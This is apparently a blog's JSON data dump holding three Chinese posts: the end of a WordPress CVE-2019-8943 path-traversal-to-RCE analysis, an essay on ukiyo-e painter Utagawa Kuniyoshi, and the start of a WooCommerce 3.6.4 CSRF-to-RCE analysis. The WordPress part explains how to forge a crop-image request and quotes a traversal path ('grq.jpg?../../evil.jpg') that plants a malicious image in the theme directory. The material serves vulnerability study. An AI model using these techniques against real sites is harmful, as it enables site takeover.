alt=\"img\"></p>\n<p>此时我们通过构造的payload修改数据库中内容，使得其如下图形式</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/13154be252945d7998ee319cf050b5d4.png\" alt=\"img\"></p>\n<p>那么最终会在themes\\currentactivetheme目录中生成我们的jpg</p>\n<p>例如cropped-evil.jpg,因为是通过剪裁后的图片，会有一个cropped前缀</p>\n<p>接下来就是代码执行部分</p>\n<p>WordPress的主题位于wp-content /  themes目录中并为不同的案例提供模板文件。正常情况下，是无法通过web方式访问、写入此目录。但是截止此时，我们通过目录穿越，已经可以将我们的恶意图像文件插入此目录。然后通过加载这个themes，即可执行恶意构造好的图片payload，这个漏洞详情可CVE-2019-6977。 影响范围WordPress  before 4.9.9 and 5.x before 5.0.1</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/b9cdd3c4f038ec583307bcf4389d9c76.png\" alt=\"img\"></p>\n<h2 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h2><p>WordPress before 4.9.9 and 5.x before 5.0.1</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/威胁情报的定义及使用.jpg","excerpt":"<p>近日，wordpress发布一个安全升级补丁，修复了一个WordPress核心中的远程代码执行漏洞。代码修改细节可以参考wordpress团队于Dec  13, 2018提交的代码。据漏洞披露者文中所介绍，这个漏洞在WordPress核心中被发现已经超过6年。</p>","more":"<h2 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" title=\"漏洞简介\"></a>漏洞简介</h2><p>1、此漏洞是由目录遍历以及本地文件包含两部分组成。</p>\n<p>2、想要利用此漏洞，需要在目标WordPress站点上拥有至少作者权限访问帐户。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>这里主要分析CVE-2019-8943这处漏洞</p>\n<p>首先看下目录遍历漏洞</p>\n<p>首先上传一张图片</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/24e5f0ff2f3351ed0134bbb856d16874.png\" alt=\"img\"></p>\n<p>图片会被wordpress保存至wp-content/uploads目录，但与此同时，在wp_postmeta表中仍然会有该图片信息的记录，如下图</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/78dc3e09777f9ae9f4db08a52ee79ded.png\" alt=\"img\"></p>\n<p>在图片被编辑时</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/6bbc2289d23fd3eb92e9275c9e8eedca.png\" alt=\"img\"></p>\n<p>会向wordpress后台发送如下post请求，如下图</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/ca67b151b90c5460fb830be4a3ba78b8.png\" alt=\"img\"></p>\n<p>在处理post参数的过程中，有如下一处代码</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/4d92b4d12064f34f5cf42d8e63f8c339.png\" alt=\"img\"></p>\n<p>可以看到if条件中有一个方法：update_post_meta</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/40cc30845af91f96de8e6ee41e8a07bc.png\" alt=\"img\"></p>\n<p>这个方法的作用是基于POST ID更新POST元字段，也就是说通过。$post_ID, $field, $value来更新数据库中的信息  以下图为例</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/0444c22768de7644c2f318d9d3759aa1.png\" alt=\"img\"></p>\n<p>此例中</p>\n<p>$post_ID:4  $field: _wp_attached_file $value: 2019/02/Chrysanthemum-e1550648854385.jpg</p>\n<table>\n<thead>\n<tr>\n<th>123</th>\n<th>$post_ID:4 $field: _wp_attached_file$value: 2019/02/Chrysanthemum-e1550648854385.jpg</th>\n</tr>\n</thead>\n<tbody><tr>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<p>在正常的修改图片操作中，$postarr[meta_input]值会为空，但是可以构造payload使得篡改数据库中对应value的操作得以实现。</p>\n<p>发送payload</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/6251818e1661de4bd6168841fbaef35b.png\" alt=\"img\"></p>\n<p>此时，$postarr[meta_input]中的key与value被遍历取出，数据库中内容被篡改</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/9c7e2868ccd0d1e78856a59d5f3461e9.png\" alt=\"img\"></p>\n<p>到此截止，我们已经成功的篡改了数据库中关于此图片文件的_wp_attached_file值，但是也是仅仅更改了数据库中的记载，文件系统中存储的实际文件名没有改变，对应的仍然是grq.jpg</p>\n<p>接下来要进行的是目录穿越，向其他目录写入这个jpg文件</p>\n<p>目录穿越漏洞位于wp_crop_image方法中</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/678397c9f695d5461fa2a31962b29ebb.png\" alt=\"img\"></p>\n<p>这个方法是用来剪裁图片。</p>\n<p>需要注意的是，在wordpress中，如果直接在页面中点开一张图片，进行剪裁操作，如下图这样</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/14c7a71a6e40828c4cf822651676e2fb.png\" alt=\"img\"></p>\n<p>是根本不会调用wp_crop_image方法的。</p>\n<p>这里一定要注意，我就是在这里被坑了很久</p>\n<p>如果想触发漏洞，调用wp_crop_image方法，那么需要自己构造数据包。</p>\n<p>当我们对图片进行剪裁变换等操作时，正常的数据包如下</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/8b5287ee628c79b726448ad684ae639f.png\" alt=\"img\"></p>\n<p>可以看到action=image-editor,</p>\n<p>看下位于wp-admin\\admin-ajax.php中的$core_actions_post数组</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/e4635806c566c0895fa89078e70b9fd5.png\" alt=\"img\"></p>\n<p>显而易见，想调用wp_crop_image方法，那action要为crop-image</p>\n<p>构造数据包如下</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/3d04b7c6587be4d15e5681d63de191bb.png\" alt=\"img\"></p>\n<p>既然已经成功的进入了wp_coce_Image()方法，再来看看这个目录穿越是如何执行的。</p>\n<p>当调用该函数时，函数首先调用get_attached_file方法中</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/678397c9f695d5461fa2a31962b29ebb.png\" alt=\"img\"></p>\n<p>get_attached_file方法通过id 寻找存在数据库中 _wp_attached_file字段的value如下图。</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/814ecb83c208192bf7d028119c2d4154.png\" alt=\"img\"></p>\n<p>这里需要提醒的是，_wp_attached_file字段中的内容我们已经通过之前步骤成功改为我们的payload，然后get_attached_file方法会将_wp_attached_file字段中的内容拼接$uploads[‘basedir’]作为图片的路径返回，这个路径会类似如下形式</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/ac817ce717dd53f9a96da32e305cfbbd.png\" alt=\"img\"></p>\n<p>C:\\wamp64\\www\\wordpress4/wp-content/uploads/2019/022019/02/grq.jpg?../../evil.jpg</p>\n<p>在得到了图片地址后</p>\n<p>首先，wordpress将会直接加载这个地址，但显而易见，文件系统中根本无法找到这个文件。</p>\n<p>当该方法失败后，WordPress将尝试从它自己的服务器下载图像。</p>\n<p>如下图，在wp_get_attachment_url方法中</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/366b7c2ab1361f42d41135047c90a69f.png\" alt=\"img\"></p>\n<p>这时候的下载链接如下</p>\n<blockquote>\n<p><a href=\"http://127.0.0.1/wordpress4/wp-content/uploads/2019/02/grq.jpg?../../evil.jpg\">http://127.0.0.1/wordpress4/wp-content/uploads/2019/02/grq.jpg?../../evil.jpg</a></p>\n</blockquote>\n<p>该URL由wp-content/uploads目录和由_wp_attached_file条目所提供的文件名组成</p>\n<p>当http协议解析这个url时，grq.jpg后面的内容会被忽略，也就是说，可以正常找到并访问该图，如下图</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/0454096af13faef6893af40c1095a57d.png\" alt=\"img\"></p>\n<p>接下来，wp_coce_Image()方法会将此文件保存，但是在保存时，并没有对传入的参数进行校验，导致了目录穿越的产生</p>\n<p>首先，先通过mkdir建立目录</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/90a1558d598dbba3e5034b6806a1c556.png\" alt=\"img\"></p>\n<p>其次，通过$editor-&gt;save将文件保存到生成目录中</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/cb4c9ea065e950e61f5870e38bf6a064.png\" alt=\"img\"></p>\n<p>此时我们通过构造的payload修改数据库中内容，使得其如下图形式</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/13154be252945d7998ee319cf050b5d4.png\" alt=\"img\"></p>\n<p>那么最终会在themes\\currentactivetheme目录中生成我们的jpg</p>\n<p>例如cropped-evil.jpg,因为是通过剪裁后的图片，会有一个cropped前缀</p>\n<p>接下来就是代码执行部分</p>\n<p>WordPress的主题位于wp-content /  themes目录中并为不同的案例提供模板文件。正常情况下，是无法通过web方式访问、写入此目录。但是截止此时，我们通过目录穿越，已经可以将我们的恶意图像文件插入此目录。然后通过加载这个themes，即可执行恶意构造好的图片payload，这个漏洞详情可CVE-2019-6977。 影响范围WordPress  before 4.9.9 and 5.x before 5.0.1</p>\n<p><img src=\"http://blog.nsfocus.net/wp-content/uploads/2019/02/b9cdd3c4f038ec583307bcf4389d9c76.png\" alt=\"img\"></p>\n<h2 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h2><p>WordPress before 4.9.9 and 5.x before 5.0.1</p>"},{"title":"武者绘之国芳","date":"2017-05-20T14:57:09.000Z","_content":"<div align=\"center\">{% asset_img 0.jpg%}</div>\n歌川国芳是江户时期与歌川国贞、歌川广重齐名的三大浮世绘画师之一（他们统属于歌川派，并不是兄弟三）。他因为在武士画上的创新而被称为“武者绘之国芳”。\n\n因为他总喜欢画三联画，往往又喜欢浓墨重笔的画些狂歌纵酒的武士、奇奇怪怪的鬼怪，而且三联画的比例拿来做桌面壁纸很好看！所以很喜欢他画的浮世绘。\n\n下面聊聊我最喜欢他画的三幅画：\n<!--more-->\n第一幅画就是封面上那个大骷髅，在日剧《大川端侦探社》里多次出现过。这幅画便是歌川国芳的《相马の古内裹》，画中的骷髅叫做咔嚓骷髅。\n<div align=\"center\">{% asset_img 4.jpg%}</div><div align=\"center\"><font color=#A9A9A9>大川端侦探社</font> </div>\n《相马の古内裹》取材自山东京伝的小说《忠义传》，描绘的是泷夜叉姬操纵巨大骸骨与大宅太郎光圀对战的故事。泷夜叉姬是平将门的妹妹（一说是女儿），传说泷夜叉姬为了替兄报仇，前往鞍马贵船神社祈愿，获得蟾蜍妖术（能夠化身为蟾蜍）替兄报仇的故事。\n\n为了表现山东京伝小说中描述的上百具骸骨战斗的宏大场面，画作者用一具巨大的骸骨给观者造成视觉上的冲击。（小骷髅！合体！）\n整个画面构图大胆，人物形态逼真，是国芳的知名代表作之一。\n\n讲完了画，再讲讲这个咔嚓骷髅。\n\n喀嚓骷髅，在《日本灵异记》中被记载，是由众多战死荒野的和没有得到埋葬的死者们的骸骨和怨念等怨灵聚集起来，变成的巨大的骷髅魔物，它会在白昼隐藏起来，夜间四处游走袭击路人，将人一把抓来，喝干他的血。\n为什么叫做咔嚓骷髅呢？因为它行动时候骨头相撞，发出咔嚓咔嚓的响声。。。\n\n<div align=\"center\">{% asset_img 1.jpeg%}</div><div align=\"center\"><font color=#A9A9A9>为朝营救图</font> </div>\n这幅画名字叫做《为朝营救图》，讲述的平安时代武将源为朝与巨浪搏斗的故事，武士、巨浪、大鱼、天狗构成了一幅惊险生猛的画面，大鱼遨游于巨浪之上营救遭遇险境的源为潮，奇诡浪漫，又是熟悉的国芳味道。\n\n大鱼张开了大嘴，我猜有人一定想要说：“我有一个大胆的想法”。\n大鱼身上葛优躺的那个就是源为朝。这幅画的海浪像极了《神奈川冲浪里》中海浪的画风，也许是那个年代海浪的模板画风吧。\n</br>\n<div align=\"center\">{% asset_img 2.jpg%}</div><div align=\"center\"><font color=#A9A9A9>宫本武藏斩巨鲸</font> </div>\n\n《宫本武藏斩巨鲸》，剑圣宫本武藏骑在巨鲸的背上，巨鲸一脸享受的样子。为什么你们从古代就和鲸鱼过不去呢？突然想到了2015年的一个电影海报，似乎有异曲同工之妙。\n<div align=\"center\">{% asset_img 3.jpeg%}</div><div align=\"center\"><font color=#A9A9A9>海洋深处</font> </div>\n\n这个一辈子画尽了英雄迷梦，神妖精怪的国芳，在44岁时却因为自己的天真付出了代价，他因触犯政府关于浮世绘题材的管控条例被捕入狱，并交了不少罚款。从那以后，那个热烈明朗，浪漫调皮的国芳灵魂似乎被抽离了一大半。进入50年代后， 身体也被疾病纠缠，笔力渐虚，一直到去世的这些年间，他的作品逐步走向不可逆转的沉寂中庸。\n\n也许，对于越单纯专注的人，最沉重的打击并非暴力本身，而是内心笃信趋向的东西被抹杀否定。经历过严刑和羞辱的国芳，这次再也没能找回那个自信热血的“一勇斋国芳”（歌川国芳自号）。\n\n人们因他在武者绘领域的大放异彩而称他为“武者国芳”。肉体会枯朽，激情会退让，晚年的国芳无心恋战。但是真高兴啊，国芳留给后世人最棒的记忆，是他盛年期璨如夏花，放肆纵情的英雄梦。","source":"_posts/ukiyoe.md","raw":"---\ntitle: 武者绘之国芳\ndate: 2017-05-20 22:57:09\ntags: 杂文\ncategories: 日常\n---\n<div align=\"center\">{% asset_img 0.jpg%}</div>\n歌川国芳是江户时期与歌川国贞、歌川广重齐名的三大浮世绘画师之一（他们统属于歌川派，并不是兄弟三）。他因为在武士画上的创新而被称为“武者绘之国芳”。\n\n因为他总喜欢画三联画，往往又喜欢浓墨重笔的画些狂歌纵酒的武士、奇奇怪怪的鬼怪，而且三联画的比例拿来做桌面壁纸很好看！所以很喜欢他画的浮世绘。\n\n下面聊聊我最喜欢他画的三幅画：\n<!--more-->\n第一幅画就是封面上那个大骷髅，在日剧《大川端侦探社》里多次出现过。这幅画便是歌川国芳的《相马の古内裹》，画中的骷髅叫做咔嚓骷髅。\n<div align=\"center\">{% asset_img 4.jpg%}</div><div align=\"center\"><font color=#A9A9A9>大川端侦探社</font> </div>\n《相马の古内裹》取材自山东京伝的小说《忠义传》，描绘的是泷夜叉姬操纵巨大骸骨与大宅太郎光圀对战的故事。泷夜叉姬是平将门的妹妹（一说是女儿），传说泷夜叉姬为了替兄报仇，前往鞍马贵船神社祈愿，获得蟾蜍妖术（能夠化身为蟾蜍）替兄报仇的故事。\n\n为了表现山东京伝小说中描述的上百具骸骨战斗的宏大场面，画作者用一具巨大的骸骨给观者造成视觉上的冲击。（小骷髅！合体！）\n整个画面构图大胆，人物形态逼真，是国芳的知名代表作之一。\n\n讲完了画，再讲讲这个咔嚓骷髅。\n\n喀嚓骷髅，在《日本灵异记》中被记载，是由众多战死荒野的和没有得到埋葬的死者们的骸骨和怨念等怨灵聚集起来，变成的巨大的骷髅魔物，它会在白昼隐藏起来，夜间四处游走袭击路人，将人一把抓来，喝干他的血。\n为什么叫做咔嚓骷髅呢？因为它行动时候骨头相撞，发出咔嚓咔嚓的响声。。。\n\n<div align=\"center\">{% asset_img 1.jpeg%}</div><div align=\"center\"><font color=#A9A9A9>为朝营救图</font> </div>\n这幅画名字叫做《为朝营救图》，讲述的平安时代武将源为朝与巨浪搏斗的故事，武士、巨浪、大鱼、天狗构成了一幅惊险生猛的画面，大鱼遨游于巨浪之上营救遭遇险境的源为潮，奇诡浪漫，又是熟悉的国芳味道。\n\n大鱼张开了大嘴，我猜有人一定想要说：“我有一个大胆的想法”。\n大鱼身上葛优躺的那个就是源为朝。这幅画的海浪像极了《神奈川冲浪里》中海浪的画风，也许是那个年代海浪的模板画风吧。\n</br>\n<div align=\"center\">{% asset_img 2.jpg%}</div><div align=\"center\"><font color=#A9A9A9>宫本武藏斩巨鲸</font> </div>\n\n《宫本武藏斩巨鲸》，剑圣宫本武藏骑在巨鲸的背上，巨鲸一脸享受的样子。为什么你们从古代就和鲸鱼过不去呢？突然想到了2015年的一个电影海报，似乎有异曲同工之妙。\n<div align=\"center\">{% asset_img 3.jpeg%}</div><div align=\"center\"><font color=#A9A9A9>海洋深处</font> </div>\n\n这个一辈子画尽了英雄迷梦，神妖精怪的国芳，在44岁时却因为自己的天真付出了代价，他因触犯政府关于浮世绘题材的管控条例被捕入狱，并交了不少罚款。从那以后，那个热烈明朗，浪漫调皮的国芳灵魂似乎被抽离了一大半。进入50年代后， 身体也被疾病纠缠，笔力渐虚，一直到去世的这些年间，他的作品逐步走向不可逆转的沉寂中庸。\n\n也许，对于越单纯专注的人，最沉重的打击并非暴力本身，而是内心笃信趋向的东西被抹杀否定。经历过严刑和羞辱的国芳，这次再也没能找回那个自信热血的“一勇斋国芳”（歌川国芳自号）。\n\n人们因他在武者绘领域的大放异彩而称他为“武者国芳”。肉体会枯朽，激情会退让，晚年的国芳无心恋战。但是真高兴啊，国芳留给后世人最棒的记忆，是他盛年期璨如夏花，放肆纵情的英雄梦。","slug":"ukiyoe","published":1,"updated":"2019-09-24T07:15:15.080Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckgrozua40054wsa99jkt2l31","content":"<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/ukiyoe/0.jpg\" class=\"\"></div>\n歌川国芳是江户时期与歌川国贞、歌川广重齐名的三大浮世绘画师之一（他们统属于歌川派，并不是兄弟三）。他因为在武士画上的创新而被称为“武者绘之国芳”。\n\n<p>因为他总喜欢画三联画，往往又喜欢浓墨重笔的画些狂歌纵酒的武士、奇奇怪怪的鬼怪，而且三联画的比例拿来做桌面壁纸很好看！所以很喜欢他画的浮世绘。</p>\n<p>下面聊聊我最喜欢他画的三幅画：</p>\n<a id=\"more\"></a>\n<p>第一幅画就是封面上那个大骷髅，在日剧《大川端侦探社》里多次出现过。这幅画便是歌川国芳的《相马の古内裹》，画中的骷髅叫做咔嚓骷髅。</p>\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/ukiyoe/4.jpg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>大川端侦探社</font> </div>\n《相马の古内裹》取材自山东京伝的小说《忠义传》，描绘的是泷夜叉姬操纵巨大骸骨与大宅太郎光圀对战的故事。泷夜叉姬是平将门的妹妹（一说是女儿），传说泷夜叉姬为了替兄报仇，前往鞍马贵船神社祈愿，获得蟾蜍妖术（能夠化身为蟾蜍）替兄报仇的故事。\n\n<p>为了表现山东京伝小说中描述的上百具骸骨战斗的宏大场面，画作者用一具巨大的骸骨给观者造成视觉上的冲击。（小骷髅！合体！）<br>整个画面构图大胆，人物形态逼真，是国芳的知名代表作之一。</p>\n<p>讲完了画，再讲讲这个咔嚓骷髅。</p>\n<p>喀嚓骷髅，在《日本灵异记》中被记载，是由众多战死荒野的和没有得到埋葬的死者们的骸骨和怨念等怨灵聚集起来，变成的巨大的骷髅魔物，它会在白昼隐藏起来，夜间四处游走袭击路人，将人一把抓来，喝干他的血。<br>为什么叫做咔嚓骷髅呢？因为它行动时候骨头相撞，发出咔嚓咔嚓的响声。。。</p>\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/ukiyoe/1.jpeg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>为朝营救图</font> </div>\n这幅画名字叫做《为朝营救图》，讲述的平安时代武将源为朝与巨浪搏斗的故事，武士、巨浪、大鱼、天狗构成了一幅惊险生猛的画面，大鱼遨游于巨浪之上营救遭遇险境的源为潮，奇诡浪漫，又是熟悉的国芳味道。\n\n<p>大鱼张开了大嘴，我猜有人一定想要说：“我有一个大胆的想法”。<br>大鱼身上葛优躺的那个就是源为朝。这幅画的海浪像极了《神奈川冲浪里》中海浪的画风，也许是那个年代海浪的模板画风吧。<br></br></p>\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/ukiyoe/2.jpg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>宫本武藏斩巨鲸</font> </div>\n\n<p>《宫本武藏斩巨鲸》，剑圣宫本武藏骑在巨鲸的背上，巨鲸一脸享受的样子。为什么你们从古代就和鲸鱼过不去呢？突然想到了2015年的一个电影海报，似乎有异曲同工之妙。</p>\n<div align=\"center\"><img src= \"/img/loading.gif\" data-lazy-src=\"/ukiyoe/3.jpeg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>海洋深处</font> </div>\n\n<p>这个一辈子画尽了英雄迷梦，神妖精怪的国芳，在44岁时却因为自己的天真付出了代价，他因触犯政府关于浮世绘题材的管控条例被捕入狱，并交了不少罚款。从那以后，那个热烈明朗，浪漫调皮的国芳灵魂似乎被抽离了一大半。进入50年代后， 身体也被疾病纠缠，笔力渐虚，一直到去世的这些年间，他的作品逐步走向不可逆转的沉寂中庸。</p>\n<p>也许，对于越单纯专注的人，最沉重的打击并非暴力本身，而是内心笃信趋向的东西被抹杀否定。经历过严刑和羞辱的国芳，这次再也没能找回那个自信热血的“一勇斋国芳”（歌川国芳自号）。</p>\n<p>人们因他在武者绘领域的大放异彩而称他为“武者国芳”。肉体会枯朽，激情会退让，晚年的国芳无心恋战。但是真高兴啊，国芳留给后世人最棒的记忆，是他盛年期璨如夏花，放肆纵情的英雄梦。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"http://blog.nsfocus.net/wp-content/uploads/2016/12/2016-NSFOCUS-Security-Report-Regarding-Network-Video-Surveillance-Systems.jpg","excerpt":"<div align=\"center\"><img src=\"/ukiyoe/0.jpg\" class=\"\"></div>\n歌川国芳是江户时期与歌川国贞、歌川广重齐名的三大浮世绘画师之一（他们统属于歌川派，并不是兄弟三）。他因为在武士画上的创新而被称为“武者绘之国芳”。\n\n<p>因为他总喜欢画三联画，往往又喜欢浓墨重笔的画些狂歌纵酒的武士、奇奇怪怪的鬼怪，而且三联画的比例拿来做桌面壁纸很好看！所以很喜欢他画的浮世绘。</p>\n<p>下面聊聊我最喜欢他画的三幅画：</p>","more":"<p>第一幅画就是封面上那个大骷髅，在日剧《大川端侦探社》里多次出现过。这幅画便是歌川国芳的《相马の古内裹》，画中的骷髅叫做咔嚓骷髅。</p>\n<div align=\"center\"><img src=\"/ukiyoe/4.jpg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>大川端侦探社</font> </div>\n《相马の古内裹》取材自山东京伝的小说《忠义传》，描绘的是泷夜叉姬操纵巨大骸骨与大宅太郎光圀对战的故事。泷夜叉姬是平将门的妹妹（一说是女儿），传说泷夜叉姬为了替兄报仇，前往鞍马贵船神社祈愿，获得蟾蜍妖术（能夠化身为蟾蜍）替兄报仇的故事。\n\n<p>为了表现山东京伝小说中描述的上百具骸骨战斗的宏大场面，画作者用一具巨大的骸骨给观者造成视觉上的冲击。（小骷髅！合体！）<br>整个画面构图大胆，人物形态逼真，是国芳的知名代表作之一。</p>\n<p>讲完了画，再讲讲这个咔嚓骷髅。</p>\n<p>喀嚓骷髅，在《日本灵异记》中被记载，是由众多战死荒野的和没有得到埋葬的死者们的骸骨和怨念等怨灵聚集起来，变成的巨大的骷髅魔物，它会在白昼隐藏起来，夜间四处游走袭击路人，将人一把抓来，喝干他的血。<br>为什么叫做咔嚓骷髅呢？因为它行动时候骨头相撞，发出咔嚓咔嚓的响声。。。</p>\n<div align=\"center\"><img src=\"/ukiyoe/1.jpeg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>为朝营救图</font> </div>\n这幅画名字叫做《为朝营救图》，讲述的平安时代武将源为朝与巨浪搏斗的故事，武士、巨浪、大鱼、天狗构成了一幅惊险生猛的画面，大鱼遨游于巨浪之上营救遭遇险境的源为潮，奇诡浪漫，又是熟悉的国芳味道。\n\n<p>大鱼张开了大嘴，我猜有人一定想要说：“我有一个大胆的想法”。<br>大鱼身上葛优躺的那个就是源为朝。这幅画的海浪像极了《神奈川冲浪里》中海浪的画风，也许是那个年代海浪的模板画风吧。<br></br></p>\n<div align=\"center\"><img src=\"/ukiyoe/2.jpg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>宫本武藏斩巨鲸</font> </div>\n\n<p>《宫本武藏斩巨鲸》，剑圣宫本武藏骑在巨鲸的背上，巨鲸一脸享受的样子。为什么你们从古代就和鲸鱼过不去呢？突然想到了2015年的一个电影海报，似乎有异曲同工之妙。</p>\n<div align=\"center\"><img src=\"/ukiyoe/3.jpeg\" class=\"\"></div><div align=\"center\"><font color=#A9A9A9>海洋深处</font> </div>\n\n<p>这个一辈子画尽了英雄迷梦，神妖精怪的国芳，在44岁时却因为自己的天真付出了代价，他因触犯政府关于浮世绘题材的管控条例被捕入狱，并交了不少罚款。从那以后，那个热烈明朗，浪漫调皮的国芳灵魂似乎被抽离了一大半。进入50年代后， 身体也被疾病纠缠，笔力渐虚，一直到去世的这些年间，他的作品逐步走向不可逆转的沉寂中庸。</p>\n<p>也许，对于越单纯专注的人，最沉重的打击并非暴力本身，而是内心笃信趋向的东西被抹杀否定。经历过严刑和羞辱的国芳，这次再也没能找回那个自信热血的“一勇斋国芳”（歌川国芳自号）。</p>\n<p>人们因他在武者绘领域的大放异彩而称他为“武者国芳”。肉体会枯朽，激情会退让，晚年的国芳无心恋战。但是真高兴啊，国芳留给后世人最棒的记忆，是他盛年期璨如夏花，放肆纵情的英雄梦。</p>"},{"title":"WordPress-WooCommerce 3.6.4 从CSRF 到 RCE","date":"2019-10-16T06:49:36.000Z","cover":"https://s2.ax1x.com/2019/10/16/KFCN4I.png","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nWooCommerce是WordPress最受欢迎的电子商务插件，安装量超过500万。\n\nWooCommerce处理产品导入方式的缺陷导致存储型XSS漏洞的产生，可以通过跨站点请求伪造（CSRF）来利用该漏洞。由于wordpress后台存在插件编辑等功能，通过xss漏洞，可以写入php代码\n\n<!--more-->\n\n# 漏洞简介\n\nWooCommerce是WordPress最受欢迎的电子商务插件，安装量超过500万。\n\nWooCommerce处理产品导入方式的缺陷导致存储型XSS漏洞的产生，可以通过跨站点请求伪造（CSRF）来利用该漏洞。由于wordpress后台存在插件编辑等功能，通过xss漏洞，可以写入php代码\n\n \n\n漏洞成因简单来说，是因为WooCommerce存在csv文件导入功能，该功能可以将csv中内容导入到产品列表中\n\n导入时共分四步(上传、列映射、导入以及done)，这四个步骤的请求是独立的，可以单独发送对应的请求，在后台完成相应的功能。\n\nWooCommerce只在第一步(上传csv文件)的时候验证了csrf token，而后续步骤并没有进行csrf防护。由于一定权限的wordpress用户可以直接在wordpress媒体库中上传csv文件，这将替代了有csrf防护的第一步，进而通过CSRF漏洞衔接后三步，导致了本次漏洞的产生。\n\n \n\n在这篇文章中，我将会为大家分析WooCommerce插件后台代码，分析本次漏洞成因，并还原本次漏洞利用，介绍POC的构造以及一些wordpress机制。\n\n \n\n## WooCommerce导入功能介绍\n\nWooCommerce可以通过csv文件导入产品\n\n![KiozkQ.png](https://s2.ax1x.com/2019/10/16/KiozkQ.png)\n\n \n\n导入之后如下图所示\n\n![Kioj0S.png](https://s2.ax1x.com/2019/10/16/Kioj0S.png)\n\nWooCommerce中的每个产品都有一个产品说明，商店经理可以在其中插入有限的HTML，即非常基本的HTML标签和属性，例如`<a>`与`href`属性结合的标签。\n\n \n\n导入过程分为四步：上传、列映射、导入以及done！\n\n 